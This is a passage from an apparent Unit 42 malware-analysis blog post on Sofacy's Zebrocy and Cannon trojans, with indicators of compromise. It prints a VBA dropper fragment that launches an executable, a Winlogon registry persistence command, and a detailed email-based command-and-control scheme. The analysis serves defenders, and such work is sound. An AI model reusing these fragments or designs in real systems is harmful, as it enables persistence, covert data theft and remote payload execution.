						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694d1166c44595701319-1"><span class="crayon-v">vAdd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"~msdn"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694d1166c44595701319-2"><span class="crayon-v">vFileName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Environ</span><span class="crayon-sy">(</span><span class="crayon-s">"APPDATA"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"\MSDN\" </span></div><div class="crayon-line" id="crayon-5f694d1166c44595701319-3"><span class="crayon-s">vFileName = vFileName + vAdd &amp; "</span><span class="crayon-sy">.</span><span class="crayon-i">e</span><span class="crayon-s">" + "</span><span class="crayon-i">x</span><span class="crayon-s">" &amp; "</span><span class="crayon-i">e</span>"</div><div class="crayon-line crayon-striped-line" id="crayon-5f694d1166c44595701319-4"><span class="crayon-e">Shell </span><span class="crayon-i">vFileName</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The payload dropped to the system (SHA256: <span style="font-family: 'courier new', courier, monospace;">6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a</span>) is a UPX packed Zebrocy variant written in the Delphi language. This variant of Zebrocy is functionally very similar to the Delphi-based payloads discussed in our previous publication on <a href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/">Sofacy attacks using Zebrocy earlier this year.</a> The developer of this particular payload configured it to use the following URL to communicate with as its C2:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://188.241.58[.]170/local/s3/filters.php</span></p>
<p>The Zebrocy Trojan gathers system specific information that it will send to the C2 server via an HTTP POST request to the above URL. Like other Zebrocy samples, this Trojan collects system specific information it will send to the C2 server by running the command <span style="font-family: 'courier new', courier, monospace;">SYSTEMINFO &amp; TASKLIST</span> on the command line and by enumerating information about connected storage devices. This specific variant of Zebrocy will also send a screenshot of the victim host as a JPEG image to the C2 server. The C2 server will then provide a secondary payload to the beacon in ASCII hexadecimal representation, which the Trojan will decode and write to the following location:</p>
<p><span style="font-family: 'courier new', courier, monospace;">%APPDATA%\Roaming\Audio\soundfix.exe</span></p>
<p>During our analysis, the C2 server provided a secondary payload that functionally appeared similar to the initial Zebrocy sample. The secondary payload was also written in Delphi and its developer configured it to communicate with its C2 server using HTTPS via the following URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxps://200.122.181[.]25/catalog/products/books.php</span></p>
<p>&nbsp;</p>
<p><span style="font-size: 18pt;">New Cannon Trojan</span></p>
<p>We were able to collect a second delivery document that shared the <span style="font-family: 'courier new', courier, monospace;">Joohn</span> author from the <span style="font-family: 'courier new', courier, monospace;">crash list(Lion Air Boeing 737).docx</span> document, as well as the <span style="font-family: 'courier new', courier, monospace;">188.241.58[.]170</span> C2 IP to host its remote template. Structurally this sample was very similar to the initially analyzed document, but the payload turned out to be a completely new tool which we have named Cannon.</p>
<p>The tool is written in C# whose malicious code exists in a namespace called <span style="font-family: 'courier new', courier, monospace;">cannon</span>, which is the basis of the Trojan’s name. The Trojan functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. The specific functions of Cannon can be seen in Table 1. This tool also has a heavy reliance on EventHandlers with timers to run its methods in a specific order and potentially increase its evasion capability.</p>
<table class=" aligncenter" width="606">
<tbody>
<tr>
<td width="132"><strong>Function</strong></td>
<td width="347"><strong>Description</strong></td>
<td width="127"><strong>Timer (seconds)</strong></td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">start_Tick</span></td>
<td width="347">Adds persistence and generates unique system specific identifier</td>
<td width="127">1</td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">inf_Tick</span></td>
<td width="347">Gathers system information</td>
<td width="127">300</td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">screen_Tick</span></td>
<td width="347">Takes a screenshot of the desktop</td>
<td width="127">10</td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">txt_Tick</span></td>
<td width="347">Logs into primary POP3 account and gets secondary POP3 account</td>
<td width="127">120</td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">load_Tick</span></td>
<td width="347">Logs into secondary POP3 account to download attachment to email</td>
<td width="127">120</td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">subject_Tick</span></td>
<td width="347">Logs into primary POP3 account to get path to for the downloaded attachment</td>
<td width="127">120</td>
</tr>
<tr>
<td width="132"><span style="font-family: 'courier new', courier, monospace;">run_Tick</span></td>
<td width="347">Moves the downloaded attachment to path and creates a process with attachment</td>
<td width="127">60</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 1 Functions executed by Cannon and their purpose</em></p>
<p>The overall purpose of Cannon is to use several email accounts to send system data (system information and screenshot) to the threat actors and to ultimately obtain a payload from an email from the actors. The image in Figure 2, in addition to the following step-by-step process illustrates how Cannon communicates with the actor-controlled C2 email address to obtain a secondary payload:</p>
<p style="text-align: center;"><img class="alignnone wp-image-94669 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/11/cannon_figure2_final_fixed.png" alt="" width="600" height="728" /><em>Figure 2 C2 process flow for Cannon</em></p>
<p>&nbsp;</p>
<ol>
<li>Cannon gathers system information and saves it to a file named ini. The Trojan sends an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with <span style="font-family: 'courier new', courier, monospace;">i.ini</span> as the attachment, <span style="font-family: 'courier new', courier, monospace;">S_inf</span> within the body and a subject with a unique system identifier via SMTPS from one of the following accounts:
<ul style="list-style-type: disc;">
<li><span style="font-family: 'courier new', courier, monospace;">Bishtr.cam47</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Lobrek.chizh</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Cervot.woprov</span></li>
</ul>
</li>
</ol>
<ol start="2">
<li>Cannon takes a screenshot and saves it to a file named ops. The Trojan sends an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with <span style="font-family: 'courier new', courier, monospace;">sysscr.ops</span> as the attachment, the string <span style="font-family: 'courier new', courier, monospace;">SCreen</span> within the body and a subject with the unique system identifier via SMTPS from one of three previously used accounts.</li>
<li>The actors likely log into <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> and process the system information and screenshot sent by the Trojan to determine if the compromised host is of interest. If the actor wishes to download an additional payload to the compromised host, they will respond by sending emails in the following steps.</li>
<li>The actor sends an email to <span style="font-family: 'courier new', courier, monospace;">trala.cosh2[at]post.cz</span> with the unique system identifier as a subject with a secondary email account and credentials in ASCII hexadecimal format within the message body. This secondary email account is unknown at this time, so we will refer to it as &#8220;secondary email account&#8221; in future steps.</li>
<li>The actor sends an email to the secondary email account with the unique system identifier as a subject with a secondary payload attached with a filename of txt.</li>
<li>Cannon logs into the <span style="font-family: 'courier new', courier, monospace;">trala.cosh2[at]post.cz</span> account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the secondary email account.</li>
<li>Cannon acknowledges the receipt of the secondary email address by sending an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with <span style="font-family: 'courier new', courier, monospace;">s.txt</span> (contains <span style="font-family: 'courier new', courier, monospace;">{SysPar = 65}</span> string) as the attachment, <span style="font-family: 'courier new', courier, monospace;">ok</span> within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.</li>
<li>The actor sends an email to <span style="font-family: 'courier new', courier, monospace;">trala.cosh2[at]post.cz</span> with the unique system identifier as a subject with a file path that the Cannon Trojan will use to save the secondary payload.</li>
<li>Cannon logs into the secondary email account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and saves the attachment named <span style="font-family: 'courier new', courier, monospace;">auddevc.txt.</span></li>
<li>Cannon acknowledges the receipt of file download by sending an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with <span style="font-family: 'courier new', courier, monospace;">l.txt</span> (contains <span style="font-family: 'courier new', courier, monospace;">090</span> string) as the attachment, <span style="font-family: 'courier new', courier, monospace;">ok2</span> within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.</li>
<li>Cannon logs into the <span style="font-family: 'courier new', courier, monospace;">trala.cosh2[at]post.cz</span> account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the file path that it will use to move the downloaded <span style="font-family: 'courier new', courier, monospace;">auddevc.txt</span> file.</li>
<li>Cannon acknowledges the receipt of file path by sending an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with <span style="font-family: 'courier new', courier, monospace;">s.txt</span> (contains <span style="font-family: 'courier new', courier, monospace;">{SysPar = 65}</span> string) as the attachment, <span style="font-family: 'courier new', courier, monospace;">ok3</span> within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.</li>
<li>Cannon moves the downloaded file to the specified path.</li>
<li>Cannon acknowledges the successful move by sending an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with<span style="font-family: 'courier new', courier, monospace;"> l.txt</span> (contains <span style="font-family: 'courier new', courier, monospace;">090</span> string) as the attachment, <span style="font-family: 'courier new', courier, monospace;">ok4</span> within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.</li>
<li>Cannon runs the downloaded file from the specified path.</li>
<li>Cannon acknowledges the successful execution by sending an email to <span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span> with <span style="font-family: 'courier new', courier, monospace;">s.txt</span> (contains <span style="font-family: 'courier new', courier, monospace;">{SysPar = 65}</span> string) as the attachment, <span style="font-family: 'courier new', courier, monospace;">ok5</span> within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.</li>
</ol>
<p>For a complete analysis of Cannon, please refer to the Appendix.</p>
<p>&nbsp;</p>
<p><span style="font-size: 18pt;">Conclusion</span></p>
<p>The Sofacy threat group continues to target government organizations in the EU, US, and former Soviet states to deliver the Zebrocy tool as a payload. In these attacks, the delivery documents used to install Zebrocy used remote templates, which increases the difficulty to analyze the attack as an active C2 server is needed to obtain the macro-enabled document. The Sofacy group also leveraged the recent Lion Air disaster as a lure in one of these attacks, which continues to show a willingness to use current events in their social engineering themes.</p>
<p>Of note, we also discovered the Sofacy group using a very similar delivery document to deliver a new Trojan called Cannon. Cannon uses SMTPS and POP3S as its C2 channel compared to Zebrocy that uses a more commonly observed HTTP or HTTPS based C2. This is not a new tactic but may be more effective at evading detection as the external hosts involved are a legitimate email service provider. Add the layer of encryption that the SMTPS and POP3S protocols provide to the legitimate web-based service and you have a very difficult C2 channel to block</p>
<p>While Sofacy’s campaign delivering Zebrocy and Cannon remains active, Palo Alto Networks customers are protected from this threat in the following ways:</p>
<ul>
<li>AutoFocuscustomers can track these samples with the <u><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Zebrocy">Zebrocy</a></u> and <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Cannon">Cannon</a></li>
<li>WildFiredetects the delivery documents, Zebrocy and Cannon payloads discussed in this blog with malicious verdicts.</li>
<li>Traps blocks the macro-ladened remote templates as Suspicious macro detected, as well as Zebrocy and Cannon payloads as Suspicious executable detected.</li>
<li>The IP addresses hosting remote templates and C2 services in these attacks are classified as Command and Control.</li>
</ul>
<p><span style="font-size: 18pt;">Indicators of Compromise</span></p>
<p><strong>Delivery Hashes</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f</span><br />
<span style="font-family: 'courier new', courier, monospace;">af77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392</span></p>
<p><strong>Remote Template Hashes</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5</span><br />
<span style="font-family: 'courier new', courier, monospace;">fc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d</span></p>
<p><strong><span style="font-size: 12pt;"><br />
Remote Templates</span></strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://188.241.58[.]170/live/owa/office.dotm</span></p>
<p><strong><br />
Zebrocy Hashes</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a</span></p>
<p><strong><br />
Zebrocy C2 URLs</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://188.241.58[.]170/local/s3/filters.php</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxps://200.122.181[.]25/catalog/products/books.php</span></p>
<p><strong><br />
Cannon Hashes</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e</span></p>
<p><strong><br />
Cannon Email Accounts<br />
</strong><span style="font-family: 'courier new', courier, monospace;">sahro.bella7[at]post.cz</span><br />
<span style="font-family: 'courier new', courier, monospace;">trala.cosh2[at]post.cz</span><br />
<span style="font-family: 'courier new', courier, monospace;">bishtr.cam47[at]post.cz</span><br />
<span style="font-family: 'courier new', courier, monospace;">lobrek.chizh[at]post.cz</span><br />
<span style="font-family: 'courier new', courier, monospace;">cervot.woprov[at]post.cz</span></p>
<h2>Appendix</h2>
<p>The Cannon Trojan is written in C# and functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. This tool uses a variety of functions that are run in a specific order to:</p>
<ul>
<li>Gather system information and a screenshot</li>
<li>Send the gathered information to the actor via an email</li>
<li>Check inbox for email from actor with payload attached</li>
<li>Download payload attached to email</li>
<li>Execute downloaded payload</li>
</ul>
<p>The functions called to carry out these activities are as follows:</p>
<p><strong>start_Tick</strong></p>
<p>This function starts off by writing the string <span style="font-family: 'courier new', courier, monospace;">{SysPar = 65}</span> to a file named <span style="font-family: 'courier new', courier, monospace;">s.txt</span>, which will be used during C2 communications throughout the execution of this Trojan. This function is also responsible for creating persistence by writing the following to <span style="font-family: 'courier new', courier, monospace;">r.bat</span> and executing it:</p>
<p><span style="font-family: 'courier new', courier, monospace;">REG ADD &#8220;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&#8221; /v Shell /t REG_SZ /d [path to wsslc.exe]</span></p>
<p>It also creates a unique system specific identifier that it will use during the C2 communications to send and receive messages. The system specific identifier is a 16 character string that the Trojan creates using the serial number of the C volume and the first 4 hexadecimal bytes from <span style="font-family: 'courier new', courier, monospace;">Environment.UserName</span>. The <span style="font-family: 'courier new', courier, monospace;">start_Tick</span> function then begins the timer to run the <span style="font-family: 'courier new', courier, monospace;">inf_Tick</span> method.</p>
<p>&nbsp;</p>
<p><strong><span style="font-size: 14.0pt; line-height: 107%;">inf_Tick</span></strong></p>
<p>Responsible for gathering system information, which it then saves to the <span style="font-family: 'courier new', courier, monospace;">i.ini</span> file:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">Application.ExecutablePath</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Environment.OSVersion</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Environment.SystemDirectory</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Environment.UserDomainName</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Environment.MachineName</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Environment.UserName</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">TimeZone.CurrentTimeZone.StandardName</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Environment.TickCount</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">DriveInfo.GetDrives() &#8211; Name,VolumeLabel,DriveFormat,DriveType,TotalSize,AvailableFreeSpace,Serial number</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Folders in C:\Program Files\</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Folders in C:\Program Files (x86)\</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Process.GetProcesses</span></li>
</ul>
<p>It will use the aforementioned authentication credentials to log into the SMTP server to send the i.ini file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">i.ini</span> attached to it with the unique system identifier as the subject and <span style="font-family: 'courier new', courier, monospace;">S_in</span>f within the body of the email message. The <span style="font-family: 'courier new', courier, monospace;">inf_Tick</span> function then begins the timer to run the <span style="font-family: 'courier new', courier, monospace;">screen_Tick</span> method.</p>
<p>&nbsp;</p>
<p><strong>screen_Tick</strong></p>
<p>Takes a screenshot of the desktop and saves it to a file named <span style="font-family: 'courier new', courier, monospace;">sysscr.ops</span>. It will use the aforementioned authentication credentials to log into the SMTP server to send the <span style="font-family: 'courier new', courier, monospace;">sysscr.ops</span> file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">sysscr.ops</span> file attached to it with the unique system identifier as the subject and <span style="font-family: 'courier new', courier, monospace;">SCreen</span> within the body of the email message. The <span style="font-family: 'courier new', courier, monospace;">screen_Tick</span> function then begins the timer to run the <span style="font-family: 'courier new', courier, monospace;">txt_Tick</span> method.</p>
<p>&nbsp;</p>
<p><strong>txt_Tick</strong></p>
<p>The Trojan will attempt to log into <span style="font-family: 'courier new', courier, monospace;">pop.seznam[.]cz</span> over POP3s using the account name <span style="font-family: 'courier new', courier, monospace;">trala.cosh2[at]post.cz</span>. If successful, the Trojan will access the messages in the inbox, specifically looking for any emails that have a subject that matches the unique system identifier. If an email exists, the Trojan will treat the email&#8217;s body as hexadecimal format and save it to a variable that will be used by the <span style="font-family: 'courier new', courier, monospace;">load_Tick</span> function. The Trojan will delete the email after reading and processing these emails.</p>
<p>If the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the <span style="font-family: 'courier new', courier, monospace;">s.txt</span> file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">s.txt</span> file attached to it with the unique system identifier as the subject and the string <span style="font-family: 'courier new', courier, monospace;">ok</span> within the body of the email message. The <span style="font-family: 'courier new', courier, monospace;">txt_Tick</span> function then begins the timer to run the <span style="font-family: 'courier new', courier, monospace;">load_Tick</span> method.</p>
<p>&nbsp;</p>
<p><strong>load_Tick</strong></p>
<p>The Trojan will first remove all occurrences of <span style="font-family: 'courier new', courier, monospace;">B&amp;</span> and <span style="font-family: 'courier new', courier, monospace;">Db</span> from the text obtained from the email in the <span style="font-family: 'courier new', courier, monospace;">txt_Tick</span> function. The Trojan will then split the remaining text on the <span style="font-family: 'courier new', courier, monospace;">%</span> character and treat the content to the left of the <span style="font-family: 'courier new', courier, monospace;">%</span> character as an account name and the content to the right as a password. The Trojan uses these credentials to log into another email account at <span style="font-family: 'courier new', courier, monospace;">pop.seznam[.]cz</span> via POP3s, which it will check for email messages that have the unique system identifier as the subject. The Trojan will parse emails with the correct subject to obtain its attachments. The Trojan will save any attachments whose names contain the string <span style="font-family: 'courier new', courier, monospace;">auddevc</span> to the system, which is meant to download a file named <span style="font-family: 'courier new', courier, monospace;">auddevc.txt</span>. The Trojan will also create a file named <span style="font-family: 'courier new', courier, monospace;">l.txt</span> that it will write the string <span style="font-family: 'courier new', courier, monospace;">090</span> to.</p>
<p>If the Trojan obtained the file from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the <span style="font-family: 'courier new', courier, monospace;">l.txt</span> file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">l.txt</span> file attached to it with the unique system identifier as the subject and <span style="font-family: 'courier new', courier, monospace;">ok2</span> within the body of the email message. The <span style="font-family: 'courier new', courier, monospace;">load_Tick</span> function then begins the timer to run the <span style="font-family: 'courier new', courier, monospace;">subject_Tick</span> method.</p>
<p>&nbsp;</p>
<p><strong>subject_Tick</strong></p>
<p>This function is very similar in functionality to the <span style="font-family: 'courier new', courier, monospace;">txt_Tick</span> function. Just like the <span style="font-family: 'courier new', courier, monospace;">txt_Tick</span> function, the Trojan will attempt to log into <span style="font-family: 'courier new', courier, monospace;">pop.seznam[.]cz</span> over POP3s using the account name <span style="font-family: 'courier new', courier, monospace;">trala.cosh2@post[.]cz</span>, again looking for subject of emails in the inbox that match the unique system identifier. The Trojan will then treat the body of the email as hexadecimal data that it will save to a variable that will be used by the <span style="font-family: 'courier new', courier, monospace;">run_Tick</span> function. The contents saved to the variable should be the path in which the actor wishes the file saved in the <span style="font-family: 'courier new', courier, monospace;">load_Tick</span> function to be moved to and run from.</p>
<p>If the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the <span style="font-family: 'courier new', courier, monospace;">s.txt</span> file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">s.txt</span> file attached to it with the unique system identifier as the subject and <span style="font-family: 'courier new', courier, monospace;">ok3</span> within the body of the email message. The <span style="font-family: 'courier new', courier, monospace;">subject_Tick</span> function then begins the timer to run the <span style="font-family: 'courier new', courier, monospace;">run_Tick</span> method.</p>
<p>&nbsp;</p>
<p><strong>run_Tick</strong></p>
<p>The Trojan will first attempt to create the directory within the path obtained from the email in the <span style="font-family: 'courier new', courier, monospace;">subject_Tick</span> function. It then attempts to move the <span style="font-family: 'courier new', courier, monospace;">auddevc.txt</span> file downloaded in the <span style="font-family: 'courier new', courier, monospace;">load_Tick</span> function to the newly created directory. If the file was successfully moved, the Trojan it will use the aforementioned authentication credentials to log into the SMTP server to send the <span style="font-family: 'courier new', courier, monospace;">l.txt</span> file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">l.txt</span> file attached to it with the unique system identifier as the subject and <span style="font-family: 'courier new', courier, monospace;">ok4</span> within the body of the email message.</p>
<p>The Trojan then attempts to create a process using the newly moved downloaded file. If the Trojan was able to successfully run the download file, it will use the aforementioned authentication credentials to log into the SMTP server to send the <span style="font-family: 'courier new', courier, monospace;">s.txt</span> file to the C2 email address. The email sent to exfiltrate this information will have <span style="font-family: 'courier new', courier, monospace;">s.txt</span> file attached to it with the unique system identifier as the subject and <span style="font-family: 'courier new', courier, monospace;">ok5</span> within the body of the email message. The Trojan would then delete the <span style="font-family: 'courier new', courier, monospace;">sysscr.ops</span> screenshot file and the <span style="font-family: 'courier new', courier, monospace;">i.ini</span> system information file before exiting.</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
